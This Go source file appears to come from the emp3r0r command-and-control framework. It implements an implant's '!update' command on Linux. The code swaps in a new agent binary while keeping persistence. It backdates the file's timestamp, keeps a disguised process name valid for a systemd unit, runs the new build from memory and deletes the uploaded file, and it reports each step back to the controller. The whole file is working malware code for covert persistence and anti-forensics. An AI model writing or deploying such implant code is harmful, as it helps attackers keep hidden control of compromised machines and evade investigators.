//go:build linux
// +build linux

// Package handler — update_linux.go
//
// !update — in-place agent binary upgrade, no redeploy walk.
//
// The operator pushes the new agent build to the target with the file
// manager (put), then runs `!update --file <path>`:
//
//  1. sanity-check the file (ELF magic, non-trivial size)
//  2. if a !persist copy exists, overwrite IT (same cover name, backdated
//     mtime) so persistence survives the upgrade, and exec that copy —
//     its basename matches the cover identity, so the new process keeps
//     the same cover name and the systemd unit stays valid
//  3. otherwise exec the uploaded build directly: its masquerade pass
//     re-execs from a memfd and self-deletes the genagent-named file
//  4. exec replaces the image only on success; on failure the old agent
//     keeps running and reports the error
//
// Identity continuity across an update: generate the new build with the
// same UUID and password (genagent --uuid, when used) and the new process
// derives the same KEK — the encrypted key cache decrypts, the TOFU pin
// stays valid, and the agent re-appears as the SAME agent after restart.
// With a fresh UUID the agent re-registers as a new identity instead.
package handler

import (
	"bytes"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

func runUpdate(cmd *cobra.Command, args []string) {
	if runtime.GOOS != "linux" {
		c2transport.NotifyC2(cmd, "Error: !update is Linux-only")
		return
	}
	filePath, _ := cmd.Flags().GetString("file")
	if filePath == "" {
		c2transport.NotifyC2(cmd, "Error: --file is required (push the new build with the file manager first)")
		return
	}
	if !util.IsExist(filePath) {
		c2transport.NotifyC2(cmd, "Error: %s not found", filePath)
		return
	}

	newBin, err := os.ReadFile(filePath)
	if err != nil {
		c2transport.NotifyC2(cmd, "Error: read %s: %v", filePath, err)
		return
	}
	// ELF sanity: magic + plausible size (a Go agent build is megabytes;
	// refuse tiny/corrupt files before gambling the session on them)
	if len(newBin) < 4 || !bytes.HasPrefix(newBin, []byte{0x7f, 'E', 'L', 'F'}) {
		c2transport.NotifyC2(cmd, "Error: %s does not look like an ELF binary (refusing to apply)", filePath)
		return
	}
	if len(newBin) < 1<<20 {
		c2transport.NotifyC2(cmd, "Error: %s is suspiciously small for a Go agent (%d bytes, refusing)", filePath, len(newBin))
		return
	}

	// exec target: prefer the persistence copy (keeps cover identity +
	// systemd unit valid), else the uploaded file itself (masquerade will
	// memfd + self-delete it)
	target := persistBinPath()
	if target != "" {
		if err := os.WriteFile(target, newBin, 0o755); err != nil {
			c2transport.NotifyC2(cmd, "Error: overwrite persist copy %s: %v", target, err)
			return
		}
		util.BackdateFile(target, 20, 180)
		// the uploaded file has been absorbed — remove it
		if !strings.EqualFold(filepath.Clean(filePath), filepath.Clean(target)) {
			_ = os.Remove(filePath)
		}
		c2transport.NotifyC2(cmd, "Update: persist copy %s replaced, restarting into the new build", target)
	} else {
		target = filePath
		if err := os.Chmod(target, 0o755); err != nil {
			c2transport.NotifyC2(cmd, "Error: chmod %s: %v", target, err)
			return
		}
		c2transport.NotifyC2(cmd, "Update: exec-ing %s (the masquerade pass will memfd + self-delete it)", target)
	}

	argv := agentutils.MasqueradeArgv(target)
	c2transport.NotifyC2(cmd, "Update: restarting as %q", filepath.Base(argv[0]))
	if err := util.ExecSelfReplace(target, argv); err != nil {
		// Exec only returns on failure — the old agent is still alive
		c2transport.NotifyC2(cmd, "Error: exec new binary: %v (old agent still running)", err)
	}
}
